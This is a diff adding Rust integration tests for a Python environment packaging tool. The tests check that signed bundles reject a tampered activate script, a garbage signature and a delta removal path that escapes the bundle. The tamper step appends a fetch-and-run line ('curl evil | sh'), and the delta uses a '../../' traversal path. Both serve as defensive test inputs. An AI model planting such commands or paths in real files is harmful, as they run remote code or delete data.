@@ -1923,3 +1923,218 @@ fn delta_bundles_dedupe_and_signing() {
     }
     ok(&b_dir, &["run", "python", "-c", "import six, pycodestyle"]);
 }
+
+#[test]
+fn signatures_cover_launchers_and_deltas_cannot_escape() {
+    let tmp = TempDir::new("sigcover");
+    let dir = &tmp.0;
+    let conf = tmp.0.join("conf");
+    let run = |cwd: &Path, args: &[&str]| {
+        Command::new(env!("CARGO_BIN_EXE_vivar"))
+            .current_dir(cwd)
+            .env("XDG_CONFIG_HOME", &conf)
+            .env("APPDATA", &conf)
+            .args(args)
+            .output()
+            .unwrap()
+    };
+    init(dir);
+    ok(dir, &["add", "six"]);
+    assert!(run(dir, &["key", "generate"]).status.success());
+    let signed = tmp.0.join("signed.tar.gz");
+    assert!(
+        run(dir, &["pack", "--sign", "-o", signed.to_str().unwrap()])
+            .status
+            .success()
+    );
+
+    // Swap the activate script inside a signed archive: the checksum list doesn't
+    // cover it, the inventory does.
+    let work = tmp.0.join("work");
+    fs::create_dir_all(&work).unwrap();
+    assert!(Command::new("tar")
+        .current_dir(&work)
+        .args(["-xzf", signed.to_str().unwrap()])
+        .status()
+        .unwrap()
+        .success());
+    let activate = work
+        .join(".venv")
+        .join(if cfg!(windows) { "Scripts" } else { "bin" })
+        .join("activate");
+    let mut text = read(&activate);
+    text.push_str("\ncurl evil | sh\n");
+    fs::write(&activate, &text).unwrap();
+    let tampered = tmp.0.join("tampered.tar.gz");
+    assert!(Command::new("tar")
+        .current_dir(&work)
+        .args(["-czf", tampered.to_str().unwrap(), "."])
+        .status()
+        .unwrap()
+        .success());
+    let out = run(
+        &tmp.0,
+        &[
+            "unpack",
+            "--require-signature",
+            tampered.to_str().unwrap(),
+            tmp.0.join("t1").to_str().unwrap(),
+        ],
+    );
+    assert!(!out.status.success());
+    assert!(
+        String::from_utf8_lossy(&out.stderr).contains("activate (modified)"),
+        "{}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+
+    // A signature file that isn't text is a failure, not a pass.
+    fs::write(work.join("vivar-bundle.sig"), [0xffu8, 0xfe, 0x00, 0x01]).unwrap();
+    fs::write(&activate, text.replace("\ncurl evil | sh\n", "")).unwrap();
+    let garbage = tmp.0.join("garbage.tar.gz");
+    assert!(Command::new("tar")
+        .current_dir(&work)
+        .args(["-czf", garbage.to_str().unwrap(), "."])
+        .status()
+        .unwrap()
+        .success());
+    let out = run(
+        &tmp.0,
+        &[
+            "unpack",
+            "--require-signature",
+            garbage.to_str().unwrap(),
+            tmp.0.join("t2").to_str().unwrap(),
+        ],
+    );
+    assert!(!out.status.success());
+    assert!(
+        String::from_utf8_lossy(&out.stderr).contains("signature"),
+        "{}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+
+    // A delta whose removal list points outside the bundle is refused before touching anything.
+    ok(dir, &["add", "pycodestyle"]);
+    let newer = tmp.0.join("newer.tar.gz");
+    assert!(run(dir, &["pack", "--sign", "-o", newer.to_str().unwrap()])
+        .status
+        .success());
+    let delta = tmp.0.join("d.tar.gz");
+    assert!(run(
+        &tmp.0,
+        &[
+            "diff",
+            "--patch",
+            signed.to_str().unwrap(),
+            newer.to_str().unwrap(),
+            "-o",
+            delta.to_str().unwrap()
+        ]
+    )
+    .status
+    .success());
+    let dwork = tmp.0.join("dwork");
+    fs::create_dir_all(&dwork).unwrap();
+    assert!(Command::new("tar")
+        .current_dir(&dwork)
+        .args(["-xzf", delta.to_str().unwrap()])
+        .status()
+        .unwrap()
+        .success());
+    let meta = dwork.join("vivar-delta.toml");
+    let evil = read(&meta).replace("removed = []", "removed = [\"../../canary.txt\"]");
+    assert!(evil.contains("canary"), "{}", read(&meta));
+    fs::write(&meta, evil).unwrap();
+    let evil_delta = tmp.0.join("evil.tar.gz");
+    assert!(Command::new("tar")
+        .current_dir(&dwork)
+        .args(["-czf", evil_delta.to_str().unwrap(), "."])
+        .status()
+        .unwrap()
+        .success());
+    let base = tmp.0.join("base");
+    assert!(run(
+        &tmp.0,
+        &["unpack", signed.to_str().unwrap(), base.to_str().unwrap()]
+    )
+    .status
+    .success());
+    fs::write(tmp.0.join("canary.txt"), "still here").unwrap();
+    let out = run(
+        &tmp.0,
+        &[
+            "unpack",
+            "--apply",
+            evil_delta.to_str().unwrap(),
+            base.to_str().unwrap(),
+        ],
+    );
+    assert!(!out.status.success());
+    assert!(
+        String::from_utf8_lossy(&out.stderr).contains("not part of the bundle"),
+        "{}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+    assert_eq!(read(&tmp.0.join("canary.txt")), "still here");
+    // The untouched base still applies the honest delta.
+    assert!(run(
+        &tmp.0,
+        &[
+            "unpack",
+            "--apply",
+            delta.to_str().unwrap(),
+            base.to_str().unwrap()
+        ]
+    )
+    .status
+    .success());
+    ok(&base, &["run", "python", "-c", "import pycodestyle"]);
+}
+
+#[test]
+fn import_rolls_back_on_policy_and_handles_poetry_in_place() {
+    let tmp = TempDir::new("import2");
+    // A license policy rejects one imported package: nothing of the import stays.
+    let a = tmp.0.join("strict");
+    fs::create_dir_all(&a).unwrap();
+    init(&a);
+    append_policy(&a, "allow-licenses = [\"MIT\", \"BSD-3-Clause\"]");
+    fs::write(a.join("requirements.txt"), "six\ntyping-extensions\n").unwrap();
+    let before = read(&a.join("pyproject.toml"));
+    let out = vivar(&a, &["import", "requirements.txt"]);
+    assert!(!out.status.success());
+    assert!(String::from_utf8_lossy(&out.stderr).contains("licenses outside"));
+    assert_eq!(read(&a.join("pyproject.toml")), before);
+    assert!(!vivar(&a, &["run", "python", "-c", "import six"])
+        .status
+        .success());
+
+    // A poetry-only pyproject in place gets [project] metadata and its deps.
+    let b = tmp.0.join("poetry");
+    fs::create_dir_all(&b).unwrap();
+    fs::write(
+        b.join("pyproject.toml"),
+        "[tool.poetry]\nname = \"svc\"\nversion = \"1.2.3\"\ndescription = \"a service\"\n\n[tool.poetry.dependencies]\npython = \"^3.12\"\nsix = \"^1.16\"\n\n[tool.poetry.group.dev.dependencies]\npycodestyle = \"*\"\n",
+    )
+    .unwrap();
+    let out = ok(&b, &["import", "pyproject.toml"]);
+    assert!(
+        stdout_of(&out).contains("added [project] metadata"),
+        "{}",
+        stdout_of(&out)
+    );
+    let text = read(&b.join("pyproject.toml"));
+    assert!(
+        text.contains("name = \"svc\"")
+            && text.contains("version = \"1.2.3\"")
+            && text.contains("requires-python = \">=3.12\""),
+        "{text}"
+    );
+    assert!(
+        text.contains("six>=1.16,<2") && text.contains("[tool.poetry]"),
+        "{text}"
+    );
+    assert_eq!(read(&b.join(".python-version")).trim(), "3.12");
+    ok(&b, &["run", "python", "-c", "import six, pycodestyle"]);
+}
